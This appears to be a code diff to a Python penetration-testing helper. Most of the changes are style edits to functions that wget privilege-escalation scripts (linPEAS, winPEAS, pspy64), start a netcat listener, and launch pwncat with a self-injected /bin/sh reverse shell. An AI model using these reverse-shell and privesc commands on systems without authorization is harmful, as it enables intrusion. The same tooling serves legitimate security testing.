@@ -16,9 +16,9 @@ from ..utils.utils import Context, Utils
 
 
 class DownloadWhat(str, Enum):
-    LINPEAS = "LINPEAS"
-    WINPEAS = "WINPEAS"
-    PSPY64 = "PSPY64"
+    LINPEAS = 'LINPEAS'
+    WINPEAS = 'WINPEAS'
+    PSPY64 = 'PSPY64'
 
 
 class ToolService:
@@ -51,22 +51,26 @@ class ToolService:
         '''
             ...
         '''
-        service_name = 'WGET'
+        service_name: str = 'WGET'
         log_runBanner(service_name)
-        path = self.utils.create_service_folder('download')
+        path: str = self.utils.create_service_folder('download')
 
-        url = None
+        url: Union[str, None] = None
+        hint: Union[str, None] = None
         if what == DownloadWhat.LINPEAS:
-            url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
+            url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
         elif what == DownloadWhat.WINPEAS:
-            url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat"
+            url = 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat'
         elif what == DownloadWhat.PSPY64:
-            url = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64"
+            url = 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64'
+            hint = f'run example: {path}/pspy64 -pfc -i 100'
 
         if url is not None:
-            self.utils.run_command_output_loop(f'nc listening...', [
+            self.utils.run_command_output_loop(f'wget...', [
                 ['wget', url, '-P', path]
             ])
+            if hint is not None:
+                logging.log(logging.INFO, hint)
 
         logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
 
@@ -118,11 +122,10 @@ class ToolService:
 
         use_sudo = []
         if port <= 1024:
-            use_sudo = ["sudo"]
+            use_sudo = ['sudo']
 
         cmd = use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)]
         log_runBanner(f'pwncat listening...')
-        logging.log(verboselogs.NOTICE, " ".join(cmd))
         self.utils.run_command_endless(command_list=cmd)
 
         logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
@@ -135,19 +138,25 @@ class ToolService:
         log_runBanner(service_name)
         path = self.utils.create_service_folder('tool/pwncat')
 
-        if host == None:
+        if host is None:
             host = self.utils.get_ip_address()
+        if host is not None:
+            use_sudo = []
+            options_port = []
+            if port is not None:
+                options_port = ['-l', str(port)]
+                if port <= 1024:
+                    use_sudo = ["sudo"]
+            # if len(self.ctx.use_sudo) > 0:
+            #     use_sudo = ["sudo"]
 
-        use_sudo = []
-        if port <= 1024:
-            use_sudo = ["sudo"]
+            cmd = use_sudo + ['pwncat']+options_port+['-vv', '--self-inject', f'/bin/sh:{host}:{port}']
+            log_runBanner(f'pwncat listening...')
+            self.utils.run_command_endless(command_list=cmd)
 
-        cmd = use_sudo + ['pwncat', '-l', str(port), '-vv', '--self-inject', f'/bin/sh:{host}:{port}']
-        log_runBanner(f'pwncat listening...')
-        logging.log(verboselogs.NOTICE, " ".join(cmd))
-        self.utils.run_command_endless(command_list=cmd)
-
-        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
+            logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
+        else:
+            logging.log(logging.ERROR, 'missing host')
 
     # --------------------------------------------------------------------------
     #
